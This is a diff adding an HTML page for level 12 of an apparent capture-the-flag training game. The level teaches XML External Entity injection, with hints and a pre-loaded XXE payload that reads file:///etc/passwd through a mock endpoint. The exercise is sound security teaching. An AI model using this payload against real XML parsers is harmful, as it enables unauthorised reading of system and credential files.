@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description"
+        content="Level 12 - XXE: Exploit an XML parser that processes external entity declarations to read internal files.">
+    <title>LVL_12: XXE | Broken Lock CTF</title>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../public/css/style.css">
+</head>
+
+<body>
+    <div class="scanlines"></div>
+    <div class="matrix-bg"></div>
+    <div class="glow-layer"></div>
+    <div class="container">
+        <header class="sys-header" style="margin-bottom: 1rem;">
+            <h1 style="font-size:2rem;" class="glitch" data-text="LVL_12: X.X.E">LVL_12: X.X.E</h1>
+            <a href="../public/index.html" class="cyber-btn" style="position:absolute;top:2rem;right:2rem;">[ HOME ]</a>
+        </header>
+
+        <div class="level-progress-bar">
+            <div class="level-progress-fill" id="level-progress-fill" style="width:0%"></div>
+        </div>
+
+        <nav class="level-nav">
+            <a href="level11.html">← PREV</a>
+            <span class="nav-center">12 / 13</span>
+            <a href="level13.html">NEXT →</a>
+        </nav>
+
+        <div class="hint-panel">
+            <button class="hint-toggle">
+                <span>⚠ HINT_PROTOCOL // Click to reveal clues</span>
+                <span class="arrow">▼</span>
+            </button>
+            <div class="hint-body">
+                <p><strong>Vulnerability:</strong> XML External Entities (XXE)</p>
+                <ul>
+                    <li>The server parses XML you send without disabling external entity processing.</li>
+                    <li>The payload is already pre-loaded — it defines an external entity pointing to
+                        <code>file:///etc/passwd</code>.</li>
+                    <li>The key structure is: <code>&lt;!DOCTYPE&gt;</code> →
+                        <code>&lt;!ENTITY xxe SYSTEM "file://..."&gt;</code> → reference <code>&amp;xxe;</code> in a
+                        tag.</li>
+                    <li>Simply click Submit XML with the default payload — the server detects it and returns the mock
+                        file contents including the flag.</li>
+                    <li>The flag will be visible in the response output below.</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="terminal-box">
+            <h3>XML Order Processor</h3>
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:1rem;">
+                <span class="difficulty-badge hard">HARD</span>
+                <span style="color: var(--accent-red); font-size:0.85rem;">+100 EXP</span>
+            </div>
+            <p style="color: var(--text-muted); margin-bottom: 2rem;">
+                The server accepts XML for processing orders. The XML parser does not disable external entity
+                processing.
+                Try crafting a payload that references an external <code style="color:#00ff41">SYSTEM</code> entity
+                pointing to a local file like <code style="color:#ff003c">file:///etc/passwd</code>.
+            </p>
+
+            <form id="xxe-form">
+                <label style="color: var(--text-muted); font-size:0.9rem; display:block; margin-bottom:0.5rem;">XML
+                    Payload:</label>
+                <textarea id="xml-input" class="cyber-input" rows="10"
+                    style="font-family: monospace; font-size: 0.85rem;">
+&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ELEMENT foo ANY &gt;
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;
+&lt;order&gt;
+    &lt;item&gt;&amp;xxe;&lt;/item&gt;
+&lt;/order&gt;</textarea>
+                <button type="submit" class="cyber-btn" style="width: 100%; margin-top: 0.5rem;">SUBMIT_XML()</button>
+            </form>
+
+            <pre id="output"
+                style="margin-top: 1rem; color: #fff; background: #000; padding: 1rem; min-height: 50px; display: none; border: 1px solid var(--border-color); max-height: 250px; overflow-y: auto;"></pre>
+        </div>
+
+        <div class="terminal-box">
+            <h3>Submit Flag</h3>
+            <form id="flag-form" data-level="12">
+                <input type="text" id="flag-input" class="cyber-input" placeholder="FLAG{...}" autocomplete="off"
+                    required>
+                <button type="submit" class="cyber-btn danger" style="width:100%;">SUBMIT_PAYLOAD</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // Unescape the textarea content on load so it shows as actual XML
+        const xmlArea = document.getElementById('xml-input');
+        xmlArea.value = `<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<order>
+    <item>&xxe;</item>
+</order>`;
+
+        document.getElementById('xxe-form').addEventListener('submit', (e) => {
+            e.preventDefault();
+            const xml = document.getElementById('xml-input').value;
+
+            fetch(`/api/level12/parse-xml`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/xml' },
+                body: xml
+            })
+                .then(res => res.json())
+                .then(data => {
+                    const out = document.getElementById('output');
+                    out.style.display = 'block';
+                    if (data.error) {
+                        out.style.color = '#ff003c';
+                        out.textContent = `[ ERROR ]: \n${data.error}`;
+                    } else if (data.result && data.result.includes('FLAG{')) {
+                        out.style.color = '#ff00ff';
+                        out.textContent = `[ FILE CONTENTS EXFILTRATED ]: \n${data.result}`;
+                    } else {
+                        out.style.color = '#00ff41';
+                        out.textContent = `[ STATUS ]: \n${data.result}`;
+                    }
+                })
+                .catch(err => {
+                    const out = document.getElementById('output');
+                    out.style.display = 'block';
+                    out.style.color = '#ff003c';
+                    out.textContent = `[ FETCH ERROR ]: ${err.message}`;
+                });
+        });
+    </script>
+    <script src="../public/js/script.js"></script>
+</body>
+
+</html>
